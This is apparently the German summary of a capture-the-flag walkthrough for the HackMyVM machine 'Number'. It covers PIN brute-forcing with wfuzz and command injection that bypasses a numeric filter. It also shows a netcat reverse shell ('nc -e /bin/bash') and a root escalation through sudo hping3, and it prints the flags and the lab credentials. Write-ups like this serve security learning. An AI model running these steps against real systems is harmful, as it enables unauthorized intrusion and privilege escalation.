# Number - HackMyVM - Medium

**Schwierigkeitsgrad:** Medium 🟡

---

## ℹ️ Maschineninformationen

*   **Plattform:** HackMyVM
*   **VM Link:** [https://hackmyvm.eu/machines/machine.php?vm=Number](https://hackmyvm.eu/machines/machine.php?vm=Number)
*   **Autor:** DarkSpirit

![Number Machine Icon](Number.png)

---

## 🏁 Übersicht

Dieser Bericht dokumentiert den Penetrationstest der virtuellen Maschine "Number" von HackMyVM. Das Ziel war die Erlangung von Systemzugriff und die Ausweitung der Berechtigungen bis auf Root-Ebene. Die Maschine wies Schwachstellen im Webbereich auf, darunter eine PIN-basierte Authentifizierung mit schwachem Brute-Force-Schutz und eine Command Injection in einem Admin-Bereich. Die Privilegien-Eskalationskette führte von der anfänglichen Webshell als `www-data` über eine horizontale Eskalation zum Benutzer `melon` (durch das Knacken des lokalen Passworts, das dem PIN entsprach) und schließlich zur Erlangung von Root-Rechten durch die Ausnutzung einer kritischen Sudo-Fehlkonfiguration für das Binary `hping3`.

---

## 📖 Zusammenfassung des Walkthroughs

Der Pentest gliederte sich in folgende Hauptphasen:

### 🔎 Reconnaissance

*   Identifizierung der Ziel-IP (192.168.2.37) im lokalen Netzwerk mittels `arp-scan`.
*   Hinzufügen des Hostnamens `number.hmv` zur lokalen `/etc/hosts`.
*   Umfassender Portscan (`nmap`), der Port 22 (SSH - OpenSSH 7.9p1) und Port 80 (HTTP - nginx 1.14.2) als offen identifizierte.

### 🌐 Web Enumeration

*   Scan des Nginx-Webservers auf Port 80 mit `nikto`, der fehlende Sicherheits-Header und interessante Pfade (`/admin/`, `/admin/index.php`, `/admin/command.php`) sowie das Verzeichnis `/pin/` identifizierte.
*   Verzeichnis-Brute-Force mit `feroxbuster` bestätigte die gefundenen Pfade und entdeckte zusätzlich `/pin/index.php`, `/pin/pincheck.php` und `/pin/whoami.php`.
*   Analyse von `/pin/index.php` zeigte, dass ein 4-stelliger numerischer PIN für den Login im `/pin/` Bereich benötigt wird.
*   Test einer falschen PIN-Eingabe an `/pin/pincheck.php` ergab eine Antwortgröße von 10 Bytes.
*   Erstellung einer Wortliste mit allen 10.000 möglichen 4-stelligen numerischen PINs mittels `crunch`.
*   Brute-Force-Angriff auf `/pin/pincheck.php` mittels `wfuzz`, gefiltert nach Antwortgrößen ungleich 10 Bytes (`--hh 10`). Der korrekte PIN `4444` wurde identifiziert.
*   Manuelle Verifizierung des PINs `4444` an `/pin/pincheck.php` ergab die Bestätigung 'PIN CORRECT, WELCOME.' und setzte ein `PHPSESSID` Session-Cookie.
*   Zugriff auf `/admin/command.php` mit dem gültigen Session-Cookie ergab weiterhin 'ACCESS NOT GRANTED.'.
*   Zugriff auf `/pin/whoami.php` mit dem gültigen Session-Cookie ergab 'You are logged as melon.', wodurch der Benutzername `melon` identifiziert wurde.
*   Zugriff auf `/admin/command.php` mit dem gültigen Session-Cookie zeigte ein Formular zur Eingabe eines 'command'-Parameters mit der Einschränkung 'Only numbers are accepted.', was auf eine Command Injection Schwachstelle hindeutet.

### 💻 Initialer Zugriff

*   Ausnutzung der Command Injection Schwachstelle in `/admin/command.php` unter Umgehung der 'Only numbers are accepted.' Prüfung durch Verwendung der Dezimaldarstellung der Angreifer-IP-Adresse (`3232236231`) in Kombination mit einem Command Separation Zeichen (z.B. `;` oder `&&`).
*   Injektion eines Reverse Shell-Befehls (`nc -e /bin/bash ...`) über die Command Injection.
*   Einrichtung eines Netcat-Listeners auf dem Angreifer-System.
*   Erfolgreiche Etablierung einer stabilen Reverse Shell als Benutzer `www-data`.

### 📈 Privilege Escalation

*   Von der `www-data` Shell: System-Enumeration. Prüfung der `sudo` Berechtigungen (`sudo -l`) zeigte keine NOPASSWD-Regeln für `www-data`. Suche nach SUID-Binaries mittels `find / -perm -4000` listete Standard-SUID-Programme auf. Prüfung der Capabilities mittels `getcap -r /` identifizierte `/usr/sbin/hping3` mit `cap_net_admin,cap_net_raw`.
*   Auslesen des Quellcodes von `/admin/admincheck.php` zeigte Hardcoded Credentials (`melon`/`4444`) für den Admin-Login.
*   Bestätigung der Existenz des Benutzerkontos `melon` (`ls /home/`).
*   Versuch der lokalen Benutzerwechsel zu `melon` mittels `su melon`. Das Passwort `4444` (aus admincheck.php) schlug fehl. Das Passwort `melon` war erfolgreich.
*   Erfolgreiche horizontale Privilegien-Eskalation auf Benutzer `melon` mittels <code>su melon</code> und Passwort 'melon'.
*   Von der `melon` Shell: Prüfung der `sudo` Berechtigungen (`sudo -l`) für Benutzer `melon`. Identifizierung einer kritischen Sudo-Fehlkonfiguration: `(root) NOPASSWD: /usr/sbin/hping3`.
*   Ausnutzung der Sudo-Fehlkonfiguration für `hping3` (mit Root-Berechtigungen und NOPASSWD) in Kombination mit der bekannten GTFOBins-Methode: Ausführung von `sudo hping3` und Eingabe von `/bin/sh` in der interaktiven Aufforderung.
*   Erfolgreiche Erlangung einer interaktiven Root-Shell.

### 🚩 Flags

*   **User Flag:** Gefunden in `/home/melon/user.txt` (oder über die Ausgabe von `./flag.sh`)
    ` HMVhi2021 `
*   **Root Flag:** Gefunden in `/root/root.txt` (oder über die Ausgabe von `./flag.sh`)
    ` HMVhappy2021 `

---

## 🧠 Wichtige Erkenntnisse

*   **Schwacher Brute-Force-Schutz:** Kurze, numerische PINs ohne Ratenbegrenzung oder Lockout-Mechanismen sind extrem anfällig für Brute-Force-Angriffe.
*   **Blind-Angriffe:** Unterschiede in der Antwortgröße bei Authentifizierungsversuchen können für Blind Brute-Force-Angriffe ausgenutzt werden.
*   **Hardcoded Credentials:** Anmeldedaten im Klartext im Quellcode sind eine schwerwiegende Schwachstelle, die leicht zur Kompromittierung anderer Konten führen kann.
*   **Passwortwiederverwendung:** Die Wiederverwendung von Passwörtern (hier PIN, Datenbank, lokales Konto) ermöglicht eine schnelle Eskalation nach der Kompromittierung des ersten Dienstes.
*   **Command Injection:** Direkte Ausführung von Benutzereingaben in Systemaufrufen ist eine kritische Schwachstelle. Numerische Einschränkungen sind leicht zu umgehen, wenn Metazeichen nicht gefiltert werden.
*   **Sudo Fehlkonfigurationen (GTFOBins):** Kritische Sudo-Regeln (insbesondere NOPASSWD) für Binaries, die zur Shell-Erlangung missbraucht werden können (gelistet in GTFOBins), sind ein direkter Weg zu Root. Jede Sudo-Regel sollte gegen GTFOBins oder ähnliche Datenbanken geprüft werden.
*   **Capabilities:** Capabilities können Privilegien gewähren, die SUID/SGID ersetzen, und müssen ebenfalls sorgfältig auditiert werden.

---

## 📄 Vollständiger Bericht

Eine detaillierte Schritt-für-Schritt-Anleitung, inklusive Befehlsausgaben, Analyse, Bewertung und Empfehlungen für jeden Schritt, finden Sie im vollständigen HTML-Bericht:

[**➡️ Vollständigen Pentest-Bericht hier ansehen**](https://alientec1908.github.io/Number_HackMyVM_Medium/)

---

*Berichtsdatum: 11. Juni 2025*
*Pentest durchgeführt von DarkSpirit*
